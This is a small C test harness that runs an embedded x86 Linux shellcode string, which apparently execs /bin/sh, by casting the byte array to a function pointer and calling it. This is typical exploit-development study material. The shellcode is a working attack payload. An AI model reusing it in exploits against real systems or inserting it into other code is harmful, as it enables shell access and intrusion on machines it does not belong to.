/* Shellcode testing */
int
main()
{
  char shellcode[] =
    "\xeb\x12\x5e\x31\xc0\x88\x46\x07"
    "\x50\x56\x31\xd2\x89\xe1\x89\xf3"
    "\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
    "\xff\x2f\x62\x69\x6e\x2f\x73\x68";

  /* p is ptr to function returning void */
  void (*p)();

  /* p points at our shellcode */
  p = (void (*)())shellcode;

  /* "Call" p */
  (*p)();

  return (0);
}
